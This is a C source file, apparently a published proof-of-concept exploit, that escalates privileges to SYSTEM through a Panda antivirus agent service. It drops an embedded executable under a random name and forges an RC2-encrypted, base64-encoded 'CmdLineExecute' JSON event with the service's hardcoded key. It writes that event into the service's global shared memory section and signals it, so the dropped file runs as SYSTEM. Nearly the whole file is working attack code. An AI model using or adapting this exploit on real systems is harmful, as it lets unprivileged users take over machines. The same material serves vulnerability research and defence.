// Souhail HAMMOU - 2019
#include <Windows.h>
#include <stdio.h>
#include <time.h>
#include <wincrypt.h>
#include "base64.h"
#include "resource.h"


#define STEPS
#define DBG
#define SECTION_SIZE 0x2414

typedef struct _KEYBLOB
{
	BLOBHEADER header;
	DWORD KeyLength;
	CHAR key[16];
} KEYBLOB;

/*
Here is an example of the events that we queue to the service
{
	"CmdLineExecute":    //Name of the event, this specific event is dispatched by Plugin_Commands.DLL
	{
		"ExeName": "cmd.exe",    //Target executable name
		"Parameters": "/c start C:\\Users\\VM\\Desktop\\run_me_as_system.exe",    //Parameters to CMD.EXE
		"SourcePath": "file://C:\\Windows\\System32",    //The directory where "ExeName" resides
		"ExeMD5": "fef8118edf7918d3c795d6ef03800519"    //MD5 hash of CMD.EXE
	}
}
*/

CHAR* CommandFormat = "{\"CmdLineExecute\":{\"ExeName\":\"%s\",\"Parameters\":\"/c start %s\",\"SourcePath\":\"file://%s\",\"ExeMD5\":\"%s\"}}";
CHAR* rc2key = "3sa342ZvSfB68aEq";

VOID EscapePathForJSON(CHAR* Dest, CHAR* FilePath)
{
	UINT i, j, prev;

	//Detect if backslashes in FilePath are already escaped based on the first backslash in the path
	for (i = 0, prev = -1; i < strlen(FilePath); i++)
	{
		if (FilePath[i] == '\\')
		{
			if (prev == -1)
				prev = i;
			else if (prev + 1 == i)
			{
				//It is already escaped, bail out !
				return;
			}
		}
	}

	//Espace the backslashes in the path
	for (i = 0, j = 0; i < strlen(FilePath); i++)
	{
		CHAR c = FilePath[i];
		Dest[j++] = c;
		if (c == '\\')
		{
			Dest[j++] = c;
		}
	}
}

VOID ConvertBHashToString(UINT Hashlen, CHAR *Dest, BYTE* Hash)
{
	/*
	Converts a hash from its binary form to a string.
	*/
	UINT hash_i;
	UINT dest_i;
	UINT8 v5;
	UINT8 v6;
	UINT8 v7;
	CHAR v8;
	CHAR v9;

	hash_i = 0;
	dest_i = 0;
	if (Hashlen)
	{
		do
		{
			v5 = Hash[hash_i];
			v6 = v5 >> 4;
			v7 = v5 % 16;
			if (v6 <= 9u)
				v8 = v6 + 0x30;
			else
				v8 = v6 + 0x57;
			if (v7 <= 9)
				v9 = v7 + 0x30;
			else
				v9 = v7 + 0x57;
			Dest[dest_i] = v8;
			Dest[dest_i + 1] = v9;
			++hash_i;
			dest_i += 2;
		} while (hash_i < Hashlen);
		Dest[dest_i] = 0;
	}
	else
	{
		*Dest = 0;
	}
}

CHAR* GetFileMd5(CHAR* filepath)
{
	/*
	Calculates the MD5 hash of a given file
	*/
	HANDLE hFile;
	HCRYPTPROV hProv = 0;
	HCRYPTHASH hHash = 0;
	DWORD nRead;
	BYTE bHash[64] = { 0 };
	DWORD bHashSz = 64;
	BYTE* buffer = NULL;
	CHAR* Hash = NULL;

	hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
#ifdef DBG
		printf("GetFileMd5 : CreateFileA failed %x !\n", GetLastError());
#endif
		return NULL;
	}

	if (!CryptAcquireContext(&hProv, 0, 0, PROV_RSA_FULL, 0))
	{
		if (GetLastError() != NTE_BAD_KEYSET || !CryptAcquireContext(&hProv, 0, 0, PROV_RSA_FULL, CRYPT_NEWKEYSET))
		{
#ifdef DBG
			printf("GetFileMd5 : CryptAcquireContext failed %x !\n", GetLastError());
#endif
			return NULL;
		}
	}

	if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash))
	{
#ifdef DBG
		printf("GetFileMd5 : CryptCreateHash failed %x !\n", GetLastError());
#endif
		return NULL;
	}

	buffer = (UCHAR*)HeapAlloc(GetProcessHeap(), 0, 0x1000);


	while (TRUE)
	{
		if (!ReadFile(hFile, buffer, 0x1000, &nRead, NULL))
		{
#ifdef DBG
			printf("GetFileMd5 : ReadFile failed %x !", GetLastError());
#endif
			return NULL;
		}

		if (!nRead)
		{
			//EOF
			if (!CryptGetHashParam(hHash, HP_HASHVAL, bHash, &bHashSz, 0))
			{
#ifdef DBG
				printf("GetFileMd5 : CryptGetHashParam failed %x!\n", GetLastError());
#endif
				return NULL;
			}
			break;
		}
		else
		{
			if (!CryptHashData(hHash, (const BYTE*)buffer, nRead, 0))
			{
#ifdef DBG
				printf("GetFileMd5 : CryptHashData failed %x !\n", GetLastError());
#endif
				return NULL;
			}
		}
	}

	/*Got the hash, now let's convert it into a string*/
	Hash = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 64);

	ConvertBHashToString(bHashSz, Hash, bHash);

	/*We're done, return the hash*/
	return Hash;
}

WCHAR* EncryptEncodeCommand(CHAR* command)
{
	/*
	The service expects the JSON event message to be encrypted using RC2 and then base64 encoded.
	This function returns the unicode base64 string of the encrypted message.
	*/
	HCRYPTPROV hProv;
	HCRYPTKEY hKey;
	KEYBLOB blob;
	DWORD EncryptedLen;
	CHAR* Encrypted = NULL;
	CHAR* B64Encoded = NULL;
	WCHAR* uB64Encoded = NULL;

	/*Setup the keyblob*/
	blob.header.aiKeyAlg = 0x6602; //RC2
	blob.header.bType = 0x8;
	blob.header.bVersion = 2;
	blob.header.reserved = 0;
	blob.KeyLength = strlen(rc2key);
	memcpy(blob.key, rc2key, strlen(rc2key));

	if (!CryptAcquireContext(&hProv, 0, 0, PROV_RSA_FULL, 0))
	{
		if (GetLastError() != NTE_BAD_KEYSET || !CryptAcquireContext(&hProv, 0, 0, PROV_RSA_FULL, CRYPT_NEWKEYSET))
		{
#ifdef DBG
			printf("EncryptString : CryptAcquireContext failed %x !\n", GetLastError());
#endif
			return NULL;
		}
	}

	if (!CryptImportKey(hProv, (const BYTE*)&blob, sizeof(KEYBLOB), 0, CRYPT_IPSEC_HMAC_KEY, &hKey))
	{
#ifdef DBG
		printf("EncryptString : CryptImportKey failed %x !\n", GetLastError());
#endif
		return NULL;
	}
	
	//Let's encrypt the message
	EncryptedLen = strlen(command);
	Encrypted = (CHAR*)HeapAlloc(GetProcessHeap(), 0, SECTION_SIZE);

	strcpy(Encrypted, command);

	if (!CryptEncrypt(hKey, 0, TRUE, 0, (BYTE*)Encrypted, &EncryptedLen, SECTION_SIZE))
	{
#ifdef DBG
		printf("EncryptString : CryptEncrypt failed %x !\n", GetLastError());
#endif
		return NULL;
	}

	//Base64 encode the encrypted command
	B64Encoded = (CHAR*)HeapAlloc(GetProcessHeap(), 0, SECTION_SIZE);
	Base64encode(B64Encoded, Encrypted, EncryptedLen);

	//Convert the Base64 to unicode since it should be written as such in the shared section
	uB64Encoded = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, SECTION_SIZE);
	mbstowcs(uB64Encoded, B64Encoded, SECTION_SIZE / 2);


	return uB64Encoded;
}

void GenRandomExeName(CHAR* Filename, int n)
{
	/*
	Generate a random executable name
	*/
	char* charset = "abcdefghijklmnopqrstuvwxyz";
	LARGE_INTEGER cnt;
	srand(time(NULL));
	for (int i = 0; i < n; i++)
	{
		Filename[i] = charset[rand() % strlen(charset)];
	}
	Filename[n] = '\0';
	strcat(Filename, ".exe");
}

VOID main(int argc, char** argv)
{
	HRSRC hRsrc;
	LPVOID PE;
	HANDLE hFile;
	DWORD Nbwritten, PathLength;
	CHAR* Filename[32];
	CHAR* ExeName = "cmd.exe";
	CHAR* TargetFilePath;
	CHAR* EscapedTargetFilePath;
	CHAR* SystemPath;
	CHAR* CmdPath;
	CHAR* FilePath;
	HANDLE hEvent;
	HANDLE hMapping;
	BYTE* View;
	CHAR* FileHash;
	CHAR* EscapedCmdPath;
	CHAR* Command;
	WCHAR* EncryptedCommand;

	//Extract our executable
	hRsrc = FindResourceA(NULL, MAKEINTRESOURCE(IDR_TARGET_FILE1), "TARGET_FILE");
	if (! hRsrc )
	{
#ifdef DBG
		printf("FindResourceA failed %x !", GetLastError());
#endif
		return;
	}

	PE = LoadResource(NULL, hRsrc);
	if (!PE)
	{
#ifdef DBG
		printf("LoadResource failed %x !", GetLastError());
#endif
		return;
	}

	//Generate random filename
	GenRandomExeName(Filename, 5);

#ifdef STEPS
	printf("[+] Dropping the executable to disk\n");
#endif
	//Create a new file in the current directory
	hFile = CreateFile(Filename, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
#ifdef DBG
		printf("CreateFile failed %x !", GetLastError());
#endif
		return;
	}

	//Write the PE file to disk
	if (!WriteFile(hFile, PE, SizeofResource(NULL, hRsrc), &Nbwritten, NULL))
	{
#ifdef DBG
		printf("WriteFile failed %x !", GetLastError());
#endif
		return;
	}

	CloseHandle(hFile);

	PathLength = GetFullPathName(Filename, 0, 0, 0);
	TargetFilePath = HeapAlloc(GetProcessHeap(), 0, PathLength);
	GetFullPathName(Filename, PathLength, TargetFilePath, NULL);

#ifdef STEPS
	printf("[+] Opening a handle to the event PandaDevicesAgentSharedMemoryChange\n");
#endif

	if (!(hEvent = OpenEventA(EVENT_ALL_ACCESS, FALSE, "Global\\PandaDevicesAgentSharedMemoryChange")))
	{
#ifdef DBG
		printf("OpenEventA failed %x !\n", GetLastError());
#endif
		return;
	}

#ifdef STEPS
	printf("[+] Mapping a view of the section PandaDevicesAgentSharedMemory into the address space\n");
#endif

	if (!(hMapping = OpenFileMappingA(FILE_MAP_WRITE | FILE_MAP_READ, FALSE, "Global\\PandaDevicesAgentSharedMemory")))
	{
#ifdef DBG
		printf("OpenFileMappingA failed %x !", GetLastError());
#endif
		return;
	}

	//Map a view of the section
	View = (BYTE*)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SECTION_SIZE);
	if (!View)
	{
#ifdef DBG
		printf("MapViewOfFile failed %x !", GetLastError());
#endif
		return;
	}

#ifdef STEPS
	printf("[+] Constructing the JSON message\n");
#endif
	//Get path to cmd.exe
	PathLength = GetSystemDirectory(0, 0);
	SystemPath = HeapAlloc(GetProcessHeap(), 0, PathLength);
	GetSystemDirectory(SystemPath, PathLength);
	
	//setup the full path to cmd.exe for MD5 hashing
	CmdPath = HeapAlloc(GetProcessHeap(), 0, strlen(SystemPath) + strlen(ExeName) + 2);
	strcpy(CmdPath, SystemPath);
	strcat(CmdPath, "\\");
	strcat(CmdPath, ExeName);
	
	//Get the MD5 hash of cmd.exe
	FileHash = GetFileMd5(CmdPath);
	if (!FileHash)
	{
#ifdef DBG
		printf("Failed to calculate the MD5 hash !\n");
#endif
		return;
	}

	/*
	Setup the JSON command
	*/

	//Escape backslashes in the full path to cmd.exe
	EscapedCmdPath = (CHAR*)HeapAlloc(GetProcessHeap(), 0, strlen(CmdPath) * 2);
	EscapePathForJSON(EscapedCmdPath, SystemPath);

	
	//Escape backslashes in the full path to our executable
	EscapedTargetFilePath = (CHAR*)HeapAlloc(GetProcessHeap(), 0, strlen(TargetFilePath) * 2);
	EscapePathForJSON(EscapedTargetFilePath, TargetFilePath);


	//Generate the final JSON
	Command = (CHAR*)HeapAlloc(GetProcessHeap(), 0, SECTION_SIZE);
	sprintf(Command, CommandFormat, ExeName, EscapedTargetFilePath, EscapedCmdPath, FileHash);

#ifdef STEPS
	printf("[+] Encrypting and encoding the message\n");
#endif
	EncryptedCommand = EncryptEncodeCommand(Command);
	if (!EncryptedCommand)
	{
#ifdef DBG
		printf("Failed to encrypt or base64 encode the command\n !");
		return;
#endif
	}

#ifdef STEPS
	printf("[+] Writing the encrypted message to the section\n");
#endif

	//Write the encrypted JSON to the section
	memcpy(View + 2, EncryptedCommand, lstrlenW(EncryptedCommand) * 2);

#ifdef STEPS
	printf("[+] Signaling the event to queue the CmdLineExecute event\n");
#endif

	//Set the event to wake up the waiting thread in AgentSvc.exe
	SetEvent(hEvent);

#ifdef STEPS
	printf("[+] SYSTEM process created !\n");
	getchar();
#endif
}